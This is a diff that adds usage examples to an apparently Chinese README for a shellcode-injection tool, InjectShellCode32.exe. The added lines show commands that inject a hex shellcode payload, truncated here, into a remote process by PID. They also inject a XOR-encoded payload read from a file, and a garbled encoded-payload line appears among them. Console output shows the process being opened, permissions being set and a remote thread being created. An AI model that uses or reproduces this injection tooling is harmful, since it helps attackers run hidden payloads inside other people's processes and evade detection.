@@ -205,3 +205,25 @@ InjectShellCode32.exe EncodeInFile --path d://xor_shellcode.txt --passwd lyshark
 [+] 格式化ShellCode字节地址 => 19df00
 [*] 激活当前反弹线程 => 2a60000
 ```
+
+ - 注入攻击载荷到远程进程
+```C
+InjectShellCode32.exe InjectProcShell --pid 13372 --shellcode fce88f0000006031d2648b523089e...
+[*] 开始注入进程PID => 13372
+[+] 打开进程: 360
+[+] 已设置权限: 3866624
+[*] 创建线程ID => 352
+```
+
+ - 注入加密后的攻击载荷
+```C
+% &{{%ssssssuspr'quw{!vqps{z&v{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'sr 
+
+InjectShellCode32.exe EncodePidInFile --pid 8384 --path d://xor_shellcode.txt --passwd lyshark
+[+] 解码ShellCode字节 => 708 bytes
+[+] 读入ShellCode长度 => 1687292
+[*] 开始注入进程PID => 8384 长度 => 354
+[+] 打开进程: 340
+[+] 已设置权限: 12451840
+[*] 创建线程ID => 356
+```
